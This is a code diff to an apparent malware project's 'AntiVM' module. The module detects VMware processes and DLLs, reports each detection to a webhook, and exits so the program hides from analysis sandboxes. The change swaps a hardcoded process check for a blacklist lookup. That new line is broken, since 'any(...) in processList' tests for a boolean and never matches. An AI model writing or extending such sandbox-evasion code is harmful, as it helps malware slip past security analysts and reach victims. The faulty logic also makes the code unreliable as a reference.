@@ -5,7 +5,7 @@ import re
 import uuid
 
 from ..utils.webhook import Webhook
-from ..constants import UserInfo
+from ..constants import UserInfo, Lists
 
 
 class AntiVM:
@@ -100,11 +100,11 @@ class AntiVM:
 
         for processNames in process.split(" "):
             if ".exe" in processNames: processList.append(processNames.replace("K\n", "").replace("\n", ""))
-
-        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList: 
-            self.webhook.send("VMwareService.exe & VMwareTray.exe process are running", "Anti VM")
+            
+        if any(Lists.VIRTUAL_MACHINE_PROCESSES) in processList:
+            self.webhook.send("Blacklisted Virtual Machine Process Running", "Anti VM")
             os._exit(1)
-                        
+            
         if os.path.exists(vmware_dll): 
             self.webhook.send("**Vmware DLL Detected**", "Anti VM")
             os._exit(1)
